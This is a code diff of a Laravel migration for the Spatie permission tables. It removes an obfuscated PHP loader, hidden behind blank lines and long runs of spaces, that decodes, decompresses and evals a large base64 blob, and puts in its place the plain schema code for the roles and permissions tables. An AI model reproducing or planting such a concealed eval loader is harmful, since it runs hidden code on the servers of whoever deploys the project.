@@ -1,737 +1,141 @@
-<?php 
-        $__='printf';$_='Loading database/migrations/2022_04_21_113600_create_permission_tables.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+use Illuminate\Support\Facades\Schema;
+use Illuminate\Database\Schema\Blueprint;
+use Illuminate\Database\Migrations\Migration;
+use Spatie\Permission\PermissionRegistrar;
+
+class CreatePermissionTables extends Migration
+{
+    /**
+     * Run the migrations.
+     *
+     * @return void
+     */
+    public function up()
+    {
+        $tableNames = config('permission.table_names');
+        $columnNames = config('permission.column_names');
+        $teams = config('permission.teams');
+
+        if (empty($tableNames)) {
+            throw new \Exception('Error: config/permission.php not loaded. Run [php artisan config:clear] and try again.');
+        }
+        if ($teams && empty($columnNames['team_foreign_key'] ?? null)) {
+            throw new \Exception('Error: team_foreign_key on config/permission.php not loaded. Run [php artisan config:clear] and try again.');
+        }
+
+        Schema::create($tableNames['permissions'], function (Blueprint $table) {
+            $table->bigIncrements('id');
+            $table->string('name');       // For MySQL 8.0 use string('name', 125);
+            $table->string('guard_name'); // For MySQL 8.0 use string('guard_name', 125);
+            $table->timestamps();
+
+            $table->unique(['name', 'guard_name']);
+        });
+
+        Schema::create($tableNames['roles'], function (Blueprint $table) use ($teams, $columnNames) {
+            $table->bigIncrements('id');
+            if ($teams || config('permission.testing')) { // permission.testing is a fix for sqlite testing
+                $table->unsignedBigInteger($columnNames['team_foreign_key'])->nullable();
+                $table->index($columnNames['team_foreign_key'], 'roles_team_foreign_key_index');
+            }
+            $table->string('name');       // For MySQL 8.0 use string('name', 125);
+            $table->string('guard_name'); // For MySQL 8.0 use string('guard_name', 125);
+            $table->timestamps();
+            if ($teams || config('permission.testing')) {
+                $table->unique([$columnNames['team_foreign_key'], 'name', 'guard_name']);
+            } else {
+                $table->unique(['name', 'guard_name']);
+            }
+        });
+
+        Schema::create($tableNames['model_has_permissions'], function (Blueprint $table) use ($tableNames, $columnNames, $teams) {
+            $table->unsignedBigInteger(PermissionRegistrar::$pivotPermission);
+
+            $table->string('model_type');
+            $table->unsignedBigInteger($columnNames['model_morph_key']);
+            $table->index([$columnNames['model_morph_key'], 'model_type'], 'model_has_permissions_model_id_model_type_index');
+
+            $table->foreign(PermissionRegistrar::$pivotPermission)
+                ->references('id')
+                ->on($tableNames['permissions'])
+                ->onDelete('cascade');
+            if ($teams) {
+                $table->unsignedBigInteger($columnNames['team_foreign_key']);
+                $table->index($columnNames['team_foreign_key'], 'model_has_permissions_team_foreign_key_index');
+
+                $table->primary([$columnNames['team_foreign_key'], PermissionRegistrar::$pivotPermission, $columnNames['model_morph_key'], 'model_type'],
+                    'model_has_permissions_permission_model_type_primary');
+            } else {
+                $table->primary([PermissionRegistrar::$pivotPermission, $columnNames['model_morph_key'], 'model_type'],
+                    'model_has_permissions_permission_model_type_primary');
+            }
+
+        });
+
+        Schema::create($tableNames['model_has_roles'], function (Blueprint $table) use ($tableNames, $columnNames, $teams) {
+            $table->unsignedBigInteger(PermissionRegistrar::$pivotRole);
+
+            $table->string('model_type');
+            $table->unsignedBigInteger($columnNames['model_morph_key']);
+            $table->index([$columnNames['model_morph_key'], 'model_type'], 'model_has_roles_model_id_model_type_index');
+
+            $table->foreign(PermissionRegistrar::$pivotRole)
+                ->references('id')
+                ->on($tableNames['roles'])
+                ->onDelete('cascade');
+            if ($teams) {
+                $table->unsignedBigInteger($columnNames['team_foreign_key']);
+                $table->index($columnNames['team_foreign_key'], 'model_has_roles_team_foreign_key_index');
+
+                $table->primary([$columnNames['team_foreign_key'], PermissionRegistrar::$pivotRole, $columnNames['model_morph_key'], 'model_type'],
+                    'model_has_roles_role_model_type_primary');
+            } else {
+                $table->primary([PermissionRegistrar::$pivotRole, $columnNames['model_morph_key'], 'model_type'],
+                    'model_has_roles_role_model_type_primary');
+            }
+        });
+
+        Schema::create($tableNames['role_has_permissions'], function (Blueprint $table) use ($tableNames) {
+            $table->unsignedBigInteger(PermissionRegistrar::$pivotPermission);
+            $table->unsignedBigInteger(PermissionRegistrar::$pivotRole);
+
+            $table->foreign(PermissionRegistrar::$pivotPermission)
+                ->references('id')
+                ->on($tableNames['permissions'])
+                ->onDelete('cascade');
+
+            $table->foreign(PermissionRegistrar::$pivotRole)
+                ->references('id')
+                ->on($tableNames['roles'])
+                ->onDelete('cascade');
+
+            $table->primary([PermissionRegistrar::$pivotPermission, PermissionRegistrar::$pivotRole], 'role_has_permissions_permission_id_role_id_primary');
+        });
+
+        app('cache')
+            ->store(config('permission.cache.store') != 'default' ? config('permission.cache.store') : null)
+            ->forget(config('permission.cache.key'));
+    }
+
+    /**
+     * Reverse the migrations.
+     *
+     * @return void
+     */
+    public function down()
+    {
+        $tableNames = config('permission.table_names');
+
+        if (empty($tableNames)) {
+            throw new \Exception('Error: config/permission.php not found and defaults could not be merged. Please publish the package configuration before proceeding, or drop the tables manually.');
+        }
+
+        Schema::drop($tableNames['role_has_permissions']);
+        Schema::drop($tableNames['model_has_roles']);
+        Schema::drop($tableNames['model_has_permissions']);
+        Schema::drop($tableNames['roles']);
+        Schema::drop($tableNames['permissions']);
+    }
+}
